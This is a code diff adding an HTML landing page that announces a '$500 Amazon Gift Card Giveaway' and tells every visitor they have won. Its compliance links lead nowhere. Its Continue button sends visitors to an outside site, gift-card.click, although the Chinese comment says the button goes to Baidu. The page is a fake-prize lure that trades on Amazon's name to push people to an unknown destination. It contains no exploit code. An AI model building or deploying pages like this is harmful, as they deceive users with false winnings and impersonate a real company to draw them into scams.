@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>$500 Amazon Gift Card Giveaway</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(180deg, #cc7700 0%, #ff9900 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+            color: white;
+            text-align: center;
+        }
+
+        /* 背景钞票装饰 */
+        .bg-money {
+            position: absolute;
+            width: 180px;
+            opacity: 0.3;
+            pointer-events: none;
+        }
+        .money1 { top: 5%; left: 5%; transform: rotate(-15deg); }
+        .money2 { top: 10%; right: 10%; transform: rotate(20deg); }
+        .money3 { bottom: 15%; left: 10%; transform: rotate(30deg); }
+        .money4 { bottom: 10%; right: 5%; transform: rotate(-25deg); }
+
+        /* 顶部合规链接 */
+        .top-links {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.6);
+            padding: 8px 15px;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .top-links a {
+            color: white;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .top-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* 主标题文案 */
+        .main-title {
+            font-size: 48px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        .amount {
+            font-size: 100px;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            margin-bottom: 15px;
+        }
+        .sub-title {
+            font-size: 42px;
+            margin-bottom: 50px;
+            line-height: 1.2;
+        }
+
+        /* 继续按钮 */
+        .continue-btn {
+            background: #111;
+            color: white;
+            border: none;
+            padding: 20px 80px;
+            font-size: 28px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        .continue-btn:hover {
+            background: #333;
+        }
+    </style>
+</head>
+<body>
+    <!-- 顶部合规链接（保留） -->
+    <div class="top-links">
+        <a href="#">Privacy Policy</a> |
+        <a href="#">Terms Of Service</a> |
+        <a href="#">Official Rules</a>
+    </div>
+
+    <!-- 主标题 -->
+    <div class="main-title">YOU'VE WON A</div>
+    <div class="amount">$500.00</div>
+    <div class="sub-title">
+        Amazon.com<br>
+        Gift Card Entry.
+    </div>
+
+    <!-- 继续按钮 + 点击跳转到百度 -->
+    <button class="continue-btn" onclick="window.location.href='https://gift-card.click/click'">Continue</button>
+</body>
+</html>
